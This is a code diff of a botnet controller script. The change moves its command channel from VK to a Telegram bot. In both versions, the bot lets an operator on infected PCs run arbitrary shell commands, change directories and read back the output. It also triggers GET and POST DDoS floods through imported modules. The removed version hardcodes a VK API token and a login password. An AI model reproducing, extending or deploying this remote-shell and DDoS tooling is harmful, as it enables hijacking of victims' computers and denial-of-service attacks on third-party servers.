@@ -1,70 +1,130 @@
-from MainDDoS import mainDDoS
-from SecondDDoS import secondDDoS
-from POSTGET import message
-from CMD import cmd
-from vk_api import VkApi
-from vk_api.longpoll import VkLongPoll, VkEventType
+import telebot
 from getpass import getuser
-import os, sys
+import config
+import os
+from dbworker import set_state, get_current_state
+from MainDDoS import mainDDoS, GETDDOS1, GETDDOS2, POSTDDOS1, POSTDDOS2, POSTDDOS3
+from SecondDDoS import secondDDoS, sGETDDOS1, sGETDDOS2, sPOSTDDOS1, sPOSTDDOS2, sPOSTDDOS3
+from CMD import cmd
 
-token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a0f6f1ff452c28d91003cfce' # Community token
-
-vk_session = VkApi(token=token) # "Run" your community
-vk = vk_session.get_api() # Begin work with API
-longpoll = VkLongPoll(vk_session) # Longpoll makes that community recive messagess
+client = telebot.TeleBot(config.config["token"])
 
 name = getuser() # Name = name of your PC
 
-message("Новый пользователь в сети, введите логин и пароль или введите '""Check""' для активации бота") # Notification about running programm
+@client.message_handler(commands=["start"])
+def login(message):
+    set_state(message.chat.id, config.States.S_LOGIN)
+    client.send_message(message.chat.id, 'Enter login and password or "Check"')
 
-# Cycle that takes messages
-for event in longpoll.listen():
-    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text: # if you send message
-        if event.text == name + ' 16080305': # if message is your PC name + password
-            # Shown all commands
-            message('Вход выполнен - ' + name)
-            message("Команды: ")
-            message('DDoS - войти в DDoS панель')
-            message('Check - проверить появились-ли новые боты')
-            message('Имя бота + cmd - командная строка')
-            message('online - боты онлайн')
-            message('version - версии всех ботов')
-            message('Имя бота + update - обновить версию бота')
-            for event in longpoll.listen(): # Wait for next command
-                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                    if event.text == 'DDoS':
-                        mainDDoS() # Run mainDDoS - with notification
-                    elif event.text == 'online':
-                        message(name + ' - Админ онлайн') # Show all bots online
-        elif event.text == 'Check': # if you logined as admin you type Check and other BotNETs will logined as bots
-            message('Бот в сети! - ' + name)
-            for event in longpoll.listen(): # Wait for next command
-                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                    if event.text == 'DDoS':
-                        secondDDoS() # Run secondDDoS - without notification
-                    elif event.text == 'online':
-                        message(name + ' - онлайн') # Show all bots online
-                    elif event.text == name + ' cmd': # Turns on CMD on selected bot
-                        message(cmd("cd"))
-                        message('Для выхода введите "Выход"')
-                        for event in longpoll.listen():  # Wait for next command
-                            if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                                if event.text != "Выход": # If message != Выход
-                                    command = '"' + event.text + '"' # String that format text
-                                    try: # If by doing command we have errors program write report to user
-                                        if (event.text == "cd"): # If you want to change directory - you write cd
-                                            message('Введите директорию. Для выхода введите "Назад"')
-                                            for event in longpoll.listen():  # Wait for next command
-                                                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                                                    if event.text != "Назад":
-                                                        os.chdir(event.text) # Change directory to message directory
-                                                        break
-                                                    else:
-                                                        message("Выходим...") # Else exit and break cycle
-                                                        break
-                                        message(cmd(command))
-                                    except:
-                                        message("Произошла ошибка. Попробуйте еще раз...") # Crush report
-                                else:
-                                    message("Выходим...") # If message == "Выход"
-                                    break
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_LOGIN)
+def login_in(message):
+    if message.text == "1":
+        client.send_message(message.chat.id, 'Logged in - ' + name + ' as Administrator')
+        client.send_message(message.chat.id, "Commands: ")
+        client.send_message(message.chat.id, 'DDOS - enter in DDoS panel')
+        client.send_message(message.chat.id, 'Check - check new bots')
+        client.send_message(message.chat.id, 'Bot name + cmd - command line')
+        client.send_message(message.chat.id, 'online - bots online')
+        set_state(message.chat.id, config.States.S_LOGINED_A)
+    elif message.text == "Check":
+        client.send_message(message.chat.id, 'Logged in - ' + name + ' as Bot')
+        set_state(message.chat.id, config.States.S_LOGINED_B)
+    else:
+        client.send_message(message.chat.id, "Wrong password")
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_LOGINED_A)
+def logined_in(message):
+    if message.text == 'DDOS':
+        client.send_message(message.chat.id, 'Choose type of DDoS:')
+        client.send_message(message.chat.id, 'GET')
+        client.send_message(message.chat.id, 'POST')
+        client.send_message(message.chat.id, 'To exit type "Exit"')
+        set_state(message.chat.id, config.States.S_DDOS_A)
+    elif message.text == 'online':
+        client.send_message(message.chat.id, name + ' - is Administrator online')
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_LOGINED_B)
+def logined_in(message):
+    if message.text == 'DDOS':
+        set_state(message.chat.id, config.States.S_DDOS_B)
+    elif message.text == 'online':
+        client.send_message(message.chat.id, name + ' - is Bot online')
+    elif message.text == name + " cmd":
+        client.send_message(message.chat.id, 'To exit type "Exit"')
+        client.send_message(message.chat.id, cmd('cd'))
+        set_state(message.chat.id, config.States.S_CMD_B)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_CMD_B)
+def CMD(message):
+    if (message.text != "Exit"):
+        if (message.text == 'cd'):
+            client.send_message(message.chat.id, "Choose dir which you want to get into")
+            set_state(message.chat.id, config.States.S_CMD_CD_B)
+        else:
+            try:
+                client.send_message(message.chat.id, cmd(message.text))
+            except:
+                client.send_message(message.chat.id, "Error")
+    else:
+        set_state(message.chat.id, config.States.S_LOGINED_B)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_CMD_CD_B)
+def CMD_CD(message):
+    try:
+        os.chdir(message.text)
+        client.send_message(message.chat.id,"Moving into: " + cmd('cd'))
+        set_state(message.chat.id, config.States.S_CMD_B)
+    except:
+        client.send_message(message.chat.id, "Error")
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_A)
+def DDoSA(message):
+    mainDDoS(message)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET1_A)
+def GETDDOS1A(message):
+    GETDDOS1(message)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET2_A)
+def GETDDOS2A(message):
+    GETDDOS2(message)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST1_A)
+def POSTDDOS1A(message):
+    POSTDDOS1(message)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST2_A)
+def POSTDDOS2A(message):
+    POSTDDOS2(message)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST3_A)
+def POSTDDOS3A(message):
+    POSTDDOS3(message)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_B)
+def DDoSB(message):
+    secondDDoS(message)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET1_B)
+def GETDDOS1B(message):
+    sGETDDOS1(message)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET2_B)
+def GETDDOS2B(message):
+    sGETDDOS2(message)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST1_B)
+def POSTDDOS1B(message):
+    sPOSTDDOS1(message)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST2_B)
+def POSTDDOS2B(message):
+    sPOSTDDOS2(message)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST3_B)
+def POSTDDOS3B(message):
+    sPOSTDDOS3(message)
+
+
+
+client.polling(none_stop = True, interval = 0)
